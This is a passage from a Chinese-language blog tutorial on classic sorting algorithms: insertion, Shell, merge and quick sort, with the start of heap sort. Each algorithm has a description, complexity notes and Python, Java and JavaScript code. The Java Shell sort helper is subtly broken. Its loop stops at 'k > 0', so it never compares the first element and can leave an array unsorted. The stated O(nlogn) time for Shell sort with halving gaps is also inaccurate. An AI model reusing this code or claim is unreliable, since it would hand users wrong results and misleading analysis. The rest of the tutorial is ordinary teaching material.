class="line">            <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> i - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(k &gt;= <span class="number">0</span> &amp;&amp; arr[k] &gt; temp)</span><br><span class="line">                k--;</span><br><span class="line">            <span class="comment">//腾出位置插进去,要插的位置是 k + 1;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i ; j &gt; k + <span class="number">1</span>; j--)</span><br><span class="line">                arr[j] = arr[j-<span class="number">1</span>];</span><br><span class="line">            <span class="comment">//插进去</span></span><br><span class="line">            arr[k+<span class="number">1</span>] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>JavaScript</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">insertionSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">var</span> preIndex, current;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">        preIndex = i - <span class="number">1</span>;</span><br><span class="line">        current = arr[i];</span><br><span class="line">        <span class="keyword">while</span> (preIndex &gt;= <span class="number">0</span> &amp;&amp; arr[preIndex] &gt; current) &#123;</span><br><span class="line">            arr[preIndex + <span class="number">1</span>] = arr[preIndex];</span><br><span class="line">            preIndex--;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[preIndex + <span class="number">1</span>] = current;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4、希尔排序（Shell-Sort）"><a href="#4、希尔排序（Shell-Sort）" class="headerlink" title="4、希尔排序（Shell Sort）"></a>4、希尔排序（Shell Sort）</h3><p>1959年Shell发明，第一个突破O(n2)的排序算法，是简单插入排序的改进版。它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序又叫缩小增量排序。</p><h4 id="4-1-算法描述"><a href="#4-1-算法描述" class="headerlink" title="4.1 算法描述"></a>4.1 算法描述</h4><p>先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序。</p><p>具体算法描述：</p><ol><li><p>选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk&#x3D;1；</p></li><li><p>按增量序列个数k，对序列进行k趟排序；</p></li><li><p>每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m的子序列，分别对各子表进行直接插入排序。<br>仅增量因子为1时，整个序列作为一个表来处理，表长度即为整个序列的长度。</p></li></ol><h4 id="4-2-动图演示"><a href="#4-2-动图演示" class="headerlink" title="4.2 动图演示"></a>4.2 动图演示</h4><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F.gif" alt="希尔排序" title="希尔排序"></p><h4 id="4-3-算法分析"><a href="#4-3-算法分析" class="headerlink" title="4.3 算法分析"></a>4.3 算法分析</h4><p>希尔排序的核心在于间隔序列的设定。既可以提前设定好间隔序列，也可以动态的定义间隔序列。<br>动态定义间隔序列的算法是《算法（第4版）》的合著者Robert Sedgewick提出的。</p><ul><li><p>时间复杂度：O(nlogn)</p></li><li><p>空间复杂度：O(1)</p></li><li><p>非稳定排序</p></li><li><p>原地排序</p></li></ul><h4 id="4-4-代码实现"><a href="#4-4-代码实现" class="headerlink" title="4.4 代码实现"></a>4.4 代码实现</h4><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shell_sort</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param data: list</span></span><br><span class="line"><span class="string">    :return: sorted data</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">if</span> length &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    step = length // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> step &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(step, length):</span><br><span class="line">            <span class="keyword">while</span> i &gt;= step <span class="keyword">and</span> data[i - step] &gt; data[i]:</span><br><span class="line">                data[i - step], data[i] = data[i], data[i - step]</span><br><span class="line">                i -= step</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        step = step // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 原始乱序</span></span><br><span class="line">    d0 = [<span class="number">2</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">44</span>]</span><br><span class="line">    d1 = shell_sort(d0)</span><br><span class="line">    <span class="built_in">print</span>(d1)</span><br><span class="line">    <span class="comment"># 正确排序</span></span><br><span class="line">    <span class="comment"># [2, 2, 2, 3, 4, 4, 4, 4, 5, 5, 5, 6, 6, 7, 9, 12, 15, 44, 45, 54, 64]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] shellSort(<span class="type">int</span> arr[]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr == <span class="literal">null</span> || arr.length &lt; <span class="number">2</span>) <span class="keyword">return</span> arr;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="comment">// 对每组间隔为 h的分组进行排序，刚开始 h = n / 2;</span></span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> n / <span class="number">2</span>; h &gt; <span class="number">0</span>; h /= <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="comment">//对各个局部分组进行插入排序</span></span><br><span class="line">             <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> h; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="comment">// 将arr[i] 插入到所在分组的正确位置上</span></span><br><span class="line">                insertI(arr, h, i);</span><br><span class="line">            &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将arr[i]插入到所在分组的正确位置上</span></span><br><span class="line"><span class="comment">     * arr[i]] 所在的分组为 ... arr[i-2*h],arr[i-h], arr[i+h] ...</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">insertI</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> h, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">        <span class="type">int</span> k;</span><br><span class="line">        <span class="keyword">for</span> (k = i - h; k &gt; <span class="number">0</span> &amp;&amp; temp &lt; arr[k]; k -= h) &#123;</span><br><span class="line">            arr[k + h] = arr[k];</span><br><span class="line">        &#125;</span><br><span class="line">        arr[k + h] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>JavaScript</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shellSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> gap = <span class="title class_">Math</span>.<span class="title function_">floor</span>(len / <span class="number">2</span>); gap &gt; <span class="number">0</span>; gap = <span class="title class_">Math</span>.<span class="title function_">floor</span>(gap / <span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="comment">// 注意：这里和动图演示的不一样，动图是分组执行，实际操作是多个分组交替执行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = gap; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> j = i;</span><br><span class="line">            <span class="keyword">var</span> current = arr[i];</span><br><span class="line">            <span class="keyword">while</span> (j - gap &gt;= <span class="number">0</span> &amp;&amp; current &lt; arr[j - gap]) &#123;</span><br><span class="line">                arr[j] = arr[j - gap];</span><br><span class="line">                j = j - gap;</span><br><span class="line">            &#125;</span><br><span class="line">            arr[j] = current;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5、归并排序（Merge-Sort）"><a href="#5、归并排序（Merge-Sort）" class="headerlink" title="5、归并排序（Merge Sort）"></a>5、归并排序（Merge Sort）</h3><p>归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。</p><p>将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为2-路归并。</p><h4 id="5-1-算法描述"><a href="#5-1-算法描述" class="headerlink" title="5.1 算法描述"></a>5.1 算法描述</h4><ol><li><p>把长度为n的输入序列分成两个长度为n&#x2F;2的子序列；</p></li><li><p>对这两个子序列分别采用归并排序；</p></li><li><p>将两个排序好的子序列合并成一个最终的排序序列。</p></li></ol><h4 id="5-2-动图演示"><a href="#5-2-动图演示" class="headerlink" title="5.2 动图演示"></a>5.2 动图演示</h4><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F.gif" alt="归并排序" title="归并排序"></p><h4 id="5-3-算法分析"><a href="#5-3-算法分析" class="headerlink" title="5.3 算法分析"></a>5.3 算法分析</h4><p>归并排序是一种稳定的排序方法。和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，<br>因为始终都是O(nlogn）的时间复杂度。代价是需要额外的内存空间。</p><ul><li><p>时间复杂度：O(nlogn)</p></li><li><p>空间复杂度：O(n)</p></li><li><p>稳定排序</p></li><li><p>非原地排序</p></li></ul><h4 id="5-4-代码实现"><a href="#5-4-代码实现" class="headerlink" title="5.4 代码实现"></a>5.4 代码实现</h4><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge_sort</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param data: list</span></span><br><span class="line"><span class="string">    :return: sorted data</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">if</span> length &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    mid = length // <span class="number">2</span></span><br><span class="line">    <span class="comment"># 分别对两个子列表并归排序</span></span><br><span class="line">    merge_left = merge_sort(data[:mid])</span><br><span class="line">    merge_right = merge_sort(data[mid:])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">data_left, data_right</span>):</span><br><span class="line">        <span class="comment"># print(data_left, data_right)</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        合并(将两个有序的列表合并成一个有序的列表)</span></span><br><span class="line"><span class="string">        :param data_left: data[:mid]</span></span><br><span class="line"><span class="string">        :param data_right:data[mid:]</span></span><br><span class="line"><span class="string">        :return: sorted data</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        left, right = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        len_left = <span class="built_in">len</span>(data_left)</span><br><span class="line">        len_right = <span class="built_in">len</span>(data_right)</span><br><span class="line">        sorted_data = []</span><br><span class="line">        <span class="keyword">while</span> left &lt; len_left <span class="keyword">and</span> right &lt; len_right:</span><br><span class="line">            <span class="keyword">if</span> data_left[left] &lt; data_right[right]:</span><br><span class="line">                sorted_data.append(data_left[left])</span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sorted_data.append(data_right[right])</span><br><span class="line">                right += <span class="number">1</span></span><br><span class="line">        sorted_data += data_left[left:]</span><br><span class="line">        sorted_data += data_right[right:]</span><br><span class="line">        <span class="keyword">return</span> sorted_data</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 合并(将两个有序的列表合并成一个有序的列表)</span></span><br><span class="line">    <span class="keyword">return</span> merge(merge_left, merge_right)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 原始乱序</span></span><br><span class="line">    d0 = [<span class="number">2</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">44</span>]</span><br><span class="line">    d1 = merge_sort(d0)</span><br><span class="line">    <span class="built_in">print</span>(d1)</span><br><span class="line">    <span class="comment"># 正确排序</span></span><br><span class="line">    <span class="comment"># [2, 2, 2, 3, 4, 4, 4, 4, 5, 5, 5, 6, 6, 7, 9, 12, 15, 44, 45, 54, 64]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MergeSort</span> &#123;</span><br><span class="line">    <span class="comment">// 归并排序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] mergeSort(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right) &#123;</span><br><span class="line">        <span class="comment">// 如果 left == right，表示数组只有一个元素，则不用递归排序</span></span><br><span class="line">        <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="comment">// 把大的数组分隔成两个数组</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">// 对左半部分进行排序</span></span><br><span class="line">            arr = mergeSort(arr, left, mid);</span><br><span class="line">            <span class="comment">// 对右半部分进行排序</span></span><br><span class="line">            arr = mergeSort(arr, mid + <span class="number">1</span>, right);</span><br><span class="line">            <span class="comment">//进行合并</span></span><br><span class="line">            merge(arr, left, mid, right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并函数，把两个有序的数组合并起来</span></span><br><span class="line">    <span class="comment">// arr[left..mif]表示一个数组，arr[mid+1 .. right]表示一个数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> mid, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="comment">//先用一个临时数组把他们合并汇总起来</span></span><br><span class="line">        <span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[right - left + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> mid + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= right) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[i] &lt; arr[j]) &#123;</span><br><span class="line">                a[k++] = arr[i++];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                a[k++] = arr[j++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= mid) a[k++] = arr[i++];</span><br><span class="line">        <span class="keyword">while</span>(j &lt;= right) a[k++] = arr[j++];</span><br><span class="line">        <span class="comment">// 把临时数组复制到原数组</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            arr[left++] = a[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>JavaScript</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">mergeSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> middle = <span class="title class_">Math</span>.<span class="title function_">floor</span>(len / <span class="number">2</span>),</span><br><span class="line">        left = arr.<span class="title function_">slice</span>(<span class="number">0</span>, middle),</span><br><span class="line">        right = arr.<span class="title function_">slice</span>(middle);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(<span class="title function_">mergeSort</span>(left), <span class="title function_">mergeSort</span>(right));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">left, right</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (left.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; right.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (left[<span class="number">0</span>] &lt;= right[<span class="number">0</span>]) &#123;</span><br><span class="line">            result.<span class="title function_">push</span>(left.<span class="title function_">shift</span>());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.<span class="title function_">push</span>(right.<span class="title function_">shift</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (left.<span class="property">length</span>)</span><br><span class="line">        result.<span class="title function_">push</span>(left.<span class="title function_">shift</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (right.<span class="property">length</span>)</span><br><span class="line">        result.<span class="title function_">push</span>(right.<span class="title function_">shift</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6、快速排序（Quick-Sort）"><a href="#6、快速排序（Quick-Sort）" class="headerlink" title="6、快速排序（Quick Sort）"></a>6、快速排序（Quick Sort）</h3><p>快速排序的基本思想：通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，<br>则可分别对这两部分记录继续进行排序，以达到整个序列有序。</p><h4 id="6-1-算法描述"><a href="#6-1-算法描述" class="headerlink" title="6.1 算法描述"></a>6.1 算法描述</h4><p>快速排序使用分治法来把一个串（list）分为两个子串（sub-lists）。</p><p>具体算法描述如下：</p><ol><li><p>从数列中挑出一个元素，称为“基准”（pivot）；</p></li><li><p>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。<br>在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</p></li><li><p>递归的（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。</p></li></ol><h4 id="6-2-动图演示"><a href="#6-2-动图演示" class="headerlink" title="6.2 动图演示"></a>6.2 动图演示</h4><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F.gif" alt="快速排序" title="快速排序"></p><h4 id="6-3-算法分析"><a href="#6-3-算法分析" class="headerlink" title="6.3 算法分析"></a>6.3 算法分析</h4><ul><li><p>时间复杂度：O(nlogn)</p></li><li><p>空间复杂度：O(logn)</p></li><li><p>非稳定排序</p></li><li><p>原地排序</p></li></ul><h4 id="6-4-代码实现"><a href="#6-4-代码实现" class="headerlink" title="6.4 代码实现"></a>6.4 代码实现</h4><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">quick_sort</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param data:list</span></span><br><span class="line"><span class="string">    :return:sorted data</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">if</span> length &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 随机基准</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">    index = random.randint(<span class="number">0</span>, length - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    left = [l <span class="keyword">for</span> l <span class="keyword">in</span> data[index + <span class="number">1</span>:] + data[<span class="number">0</span>:index] <span class="keyword">if</span> l &lt;= data[index]]</span><br><span class="line">    right = [r <span class="keyword">for</span> r <span class="keyword">in</span> data[index + <span class="number">1</span>:] + data[<span class="number">0</span>:index] <span class="keyword">if</span> r &gt; data[index]]</span><br><span class="line">    <span class="comment">#  有序数据 = 基准左侧  + 基准 + 基准右侧</span></span><br><span class="line">    <span class="keyword">return</span> quick_sort(left) + [data[index]] + quick_sort(right)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 原始乱序</span></span><br><span class="line">    d0 = [<span class="number">2</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">44</span>]</span><br><span class="line">    d1 = quick_sort(d0)</span><br><span class="line">    <span class="built_in">print</span>(d1)</span><br><span class="line">    <span class="comment"># 正确排序</span></span><br><span class="line">    <span class="comment"># [2, 2, 2, 3, 4, 4, 4, 4, 5, 5, 5, 6, 6, 7, 9, 12, 15, 44, 45, 54, 64]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuickSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] quickSort(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right) &#123;</span><br><span class="line">        <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="comment">//获取中轴元素所处的位置</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> partition(arr, left, right);</span><br><span class="line">            <span class="comment">//进行分割</span></span><br><span class="line">            arr = quickSort(arr, left, mid - <span class="number">1</span>);</span><br><span class="line">            arr = quickSort(arr, mid + <span class="number">1</span>, right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">partition</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="comment">//选取中轴元素</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">pivot</span> <span class="operator">=</span> arr[left];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> right;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// 向右找到第一个小于等于 pivot 的元素位置</span></span><br><span class="line">            <span class="keyword">while</span> (i &lt;= j &amp;&amp; arr[i] &lt;= pivot) i++;</span><br><span class="line">            <span class="comment">// 向左找到第一个大于等于 pivot 的元素位置</span></span><br><span class="line">            <span class="keyword">while</span>(i &lt;= j &amp;&amp; arr[j] &gt;= pivot ) j--;</span><br><span class="line">            <span class="keyword">if</span>(i &gt;= j)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//交换两个元素的位置，使得左边的元素不大于pivot,右边的不小于pivot</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">            arr[i] = arr[j];</span><br><span class="line">            arr[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[left] = arr[j];</span><br><span class="line">        <span class="comment">// 使中轴元素处于有序的位置</span></span><br><span class="line">        arr[j] = pivot;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>JavaScript</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">quickSort</span>(<span class="params">arr, left, right</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.<span class="property">length</span>,</span><br><span class="line">        partitionIndex,</span><br><span class="line">        left = <span class="keyword">typeof</span> left != <span class="string">&#x27;number&#x27;</span> ? <span class="number">0</span> : left,</span><br><span class="line">        right = <span class="keyword">typeof</span> right != <span class="string">&#x27;number&#x27;</span> ? len - <span class="number">1</span> : right;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">        partitionIndex = <span class="title function_">partition</span>(arr, left, right);</span><br><span class="line">        <span class="title function_">quickSort</span>(arr, left, partitionIndex - <span class="number">1</span>);</span><br><span class="line">        <span class="title function_">quickSort</span>(arr, partitionIndex + <span class="number">1</span>, right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">partition</span>(<span class="params">arr, left, right</span>) &#123;    <span class="comment">// 分区操作</span></span><br><span class="line">    <span class="keyword">var</span> pivot = left,                     <span class="comment">// 设定基准值（pivot）</span></span><br><span class="line">        index = pivot + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = index; i &lt;= right; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &lt; arr[pivot]) &#123;</span><br><span class="line">            <span class="title function_">swap</span>(arr, i, index);</span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">swap</span>(arr, pivot, index - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> index - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params">arr, i, j</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> temp = arr[i];</span><br><span class="line">    arr[i] = arr[j];</span><br><span class="line">    arr[j] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7、堆排序（Heap-Sort）"><a href="#7、堆排序（Heap-Sort）" class="headerlink" title="7、堆排序（Heap Sort）"></a>7、堆排序（Heap Sort）</h3><p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。</p><h4 id="7-1-算法描述"><a href="#7-1-算法描述" class="headerlink" title="7.1 算法描述"></a>7.1 